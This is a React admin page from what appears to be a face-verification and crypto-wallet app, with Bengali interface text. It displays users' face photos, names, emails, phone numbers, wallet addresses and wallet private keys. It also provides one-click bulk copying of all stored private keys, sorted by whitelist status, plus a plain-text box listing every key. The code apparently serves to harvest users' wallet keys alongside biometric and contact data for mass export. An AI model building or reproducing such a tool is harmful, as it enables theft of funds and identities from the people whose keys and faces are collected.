import { createFileRoute } from "@tanstack/react-router";
import { useQuery, useMutation } from "@tanstack/react-query";
import { adminListFaces, adminResetTask } from "@/lib/admin.functions";
import { Copy, Loader2, RefreshCw, X } from "lucide-react";
import { toast } from "sonner";
import { useState } from "react";

export const Route = createFileRoute("/admin/faces")({ component: AdminFaces });

function AdminFaces() {
  const [zoom, setZoom] = useState<{ url: string; label: string } | null>(null);
  const { data, isLoading, refetch } = useQuery({ queryKey: ["admin-faces"], queryFn: () => adminListFaces() });
  const reset = useMutation({
    mutationFn: (taskId: string) => adminResetTask({ data: { taskId } }),
    onSuccess: () => { toast.success("Slot reset"); refetch(); },
    onError: (e: any) => toast.error(e.message),
  });
  const copy = async (value?: string | null, label = "Copy হয়েছে") => {
    if (!value) return;
    await navigator.clipboard.writeText(value);
    toast.success(label);
  };

  if (isLoading) return <div className="py-10 flex justify-center"><Loader2 className="w-5 h-5 animate-spin text-cyan" /></div>;

  const allKeys = (data ?? [])
    .map((t: any) => t.wallet_private_key as string | null)
    .filter((k: string | null): k is string => !!k) as string[];
  const whitelistedKeys = (data ?? [])
    .filter((t: any) => t.wallet_private_key && (t.whitelist_ok ?? false))
    .map((t: any) => t.wallet_private_key as string);
  const notWhitelistedKeys = (data ?? [])
    .filter((t: any) => t.wallet_private_key && !(t.whitelist_ok ?? false))
    .map((t: any) => t.wallet_private_key as string);
  const reverifyKeys = (data ?? [])
    .filter((t: any) => t.wallet_private_key && (t.reverify_count ?? 0) > 0)
    .map((t: any) => t.wallet_private_key as string);
  const copyAllKeys = async () => {
    if (allKeys.length === 0) return toast.error("কোনো key নেই");
    await navigator.clipboard.writeText(allKeys.join("\n"));
    toast.success(`${allKeys.length} টি key কপি হয়েছে (সব)`);
  };
  const copyAllWhitelisted = async () => {
    if (whitelistedKeys.length === 0) return toast.error("কোনো whitelisted key নেই");
    await navigator.clipboard.writeText(whitelistedKeys.join("\n"));
    toast.success(`${whitelistedKeys.length} টি whitelisted key কপি হয়েছে`);
  };
  const copyAllNotWhitelisted = async () => {
    if (notWhitelistedKeys.length === 0) return toast.error("কোনো not-whitelisted key নেই");
    await navigator.clipboard.writeText(notWhitelistedKeys.join("\n"));
    toast.success(`${notWhitelistedKeys.length} টি not-whitelisted key কপি হয়েছে`);
  };
  const copyAllReverify = async () => {
    if (reverifyKeys.length === 0) return toast.error("কোনো re-verify key নেই");
    await navigator.clipboard.writeText(reverifyKeys.join("\n"));
    toast.success(`${reverifyKeys.length} টি re-verify key কপি হয়েছে`);
  };

  return (
    <div>
      <div className="glass rounded-xl p-3 mb-3 space-y-2">
        <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-bold">
          Total saved faces: {data?.length ?? 0} · Total keys: {allKeys.length} · Whitelisted: {whitelistedKeys.length} · Not-whitelisted: {notWhitelistedKeys.length}
        </p>
        <button onClick={copyAllKeys}
          className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-cyan/15 border border-cyan/30 text-cyan font-black text-xs btn-press">
          <Copy className="w-3.5 h-3.5" /> সব key কপি করুন ({allKeys.length})
        </button>
        <div className="grid grid-cols-2 gap-2">
          <button onClick={copyAllWhitelisted}
            className="flex items-center justify-center gap-1.5 py-2 rounded-lg bg-emerald/15 border border-emerald/30 text-emerald font-black text-[11px] btn-press">
            <Copy className="w-3 h-3" /> Whitelisted ({whitelistedKeys.length})
          </button>
          <button onClick={copyAllNotWhitelisted}
            className="flex items-center justify-center gap-1.5 py-2 rounded-lg bg-amber/15 border border-amber/30 text-amber font-black text-[11px] btn-press">
            <Copy className="w-3 h-3" /> Not-whitelisted ({notWhitelistedKeys.length})
          </button>
        </div>
        <textarea
          readOnly
          value={allKeys.join("\n")}
          placeholder="সব private key এখানে দেখাবে"
          className="w-full h-24 px-2 py-1.5 rounded bg-surface-2 border border-border text-[10px] mono-num resize-none outline-none"
        />
      </div>
      <div className="grid grid-cols-2 gap-2">
        {(data ?? []).map((t: any) => (
          <div key={t.id} className="glass rounded-xl overflow-hidden">
            {t.signed_url ? (
              <button type="button" onClick={() => setZoom({ url: t.signed_url, label: `${t.face_label || t.profiles?.display_name || "মুখ"} · Slot #${t.slot}` })}
                className="block w-full">
                <img src={t.signed_url} alt="" className="w-full aspect-square object-cover cursor-zoom-in" />
              </button>
            ) : (
              <div className="w-full aspect-square bg-surface-2 flex items-center justify-center text-xs text-muted-foreground">no image</div>
            )}
            <div className="p-2 space-y-0.5">
              {t.face_label && <p className="text-[11px] font-black text-amber truncate">{t.face_label}</p>}
              <p className="text-[10px] font-bold truncate">{t.profiles?.display_name ?? t.profiles?.email}</p>
              {t.profiles?.phone_number && <p className="text-[9px] text-muted-foreground mono-num truncate">{t.profiles.phone_number}</p>}
              <p className="text-[9px] text-muted-foreground">Slot #{t.slot} • {t.status} {t.whitelist_ok ? "· ✅" : "· ⚠️"}</p>
              {t.wallet_address && (
                <button onClick={() => copy(t.wallet_address, "Wallet copied")} className="w-full flex items-center justify-between gap-1 px-2 py-1 rounded bg-surface-2 mono-num">
                  <span className="text-[8px] text-cyan truncate">{t.wallet_address}</span><Copy className="w-3 h-3 shrink-0" />
                </button>
              )}
              {t.wallet_private_key && (
                <button onClick={() => copy(t.wallet_private_key, "Private key copied")} className="w-full flex items-center justify-between gap-1 px-2 py-1 rounded bg-surface-2 mono-num">
                  <span className="text-[8px] text-muted-foreground truncate">key: {t.wallet_private_key}</span><Copy className="w-3 h-3 shrink-0" />
                </button>
              )}
              <p className="text-[9px] text-muted-foreground">
                {t.initial_verify_at ? new Date(t.initial_verify_at).toLocaleDateString() : "—"}
              </p>
              <button onClick={() => { if (confirm(`Reset slot #${t.slot}? Face + key permanently deleted.`)) reset.mutate(t.id); }}
                className="w-full text-[9px] text-rose flex items-center justify-center gap-1 py-1 rounded bg-rose/10 border border-rose/20 mt-1">
                <RefreshCw className="w-2.5 h-2.5" /> Reset slot
              </button>
            </div>
          </div>
        ))}
      </div>

      {zoom && (
        <div onClick={() => setZoom(null)}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm p-4">
          <button onClick={() => setZoom(null)}
            className="absolute top-4 right-4 rounded-full bg-white/10 hover:bg-white/20 p-2 text-white">
            <X className="w-5 h-5" />
          </button>
          <div className="flex flex-col items-center gap-3 max-w-full max-h-full" onClick={(e) => e.stopPropagation()}>
            <img src={zoom.url} alt={zoom.label}
              className="max-w-full max-h-[80vh] rounded-2xl border-2 border-white/20 shadow-2xl object-contain" />
            <p className="text-white font-bold text-sm">{zoom.label}</p>
          </div>
        </div>
      )}
    </div>
  );
}
